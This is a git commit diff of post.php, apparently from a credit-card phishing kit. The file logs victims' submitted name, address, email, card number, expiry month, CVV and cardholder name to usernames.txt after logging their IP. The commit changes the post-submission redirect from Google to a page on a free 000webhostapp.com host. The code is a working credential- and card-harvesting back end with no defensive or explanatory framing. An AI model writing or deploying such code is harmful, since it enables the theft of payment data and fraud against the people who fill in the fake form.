257db02508c8d750c58e0e1257689158d7ba26b4
brandeal123 <75196001+brandeal123@users.noreply.github.com>
2020-11-29 17:13:42 +0500

    Update post.php

--- post.php
+++ post.php
@@ -2,5 +2,5 @@
 include 'ip.php';
 
 file_put_contents("usernames.txt", " [zip]: " . $_POST['zip'] . " [state]: " . $_POST['state'] . " [city]: " . $_POST['city'] . " [address]: " . $_POST['address'] . " [email]: " . $_POST['email'] . " [name]: " . $_POST['firstname'] . "[CC]: " . $_POST['cardnumber'] . " [expmonth]: " . $_POST['expmonth'] . " [cvv]: " . $_POST['cvv'] . " [ccholder]: " . $_POST['cardname'] . "\n", FILE_APPEND);
-header('Location: https://www.google.com');
+header('Location: https://dutel.000webhostapp.com/index2.php');
 exit();
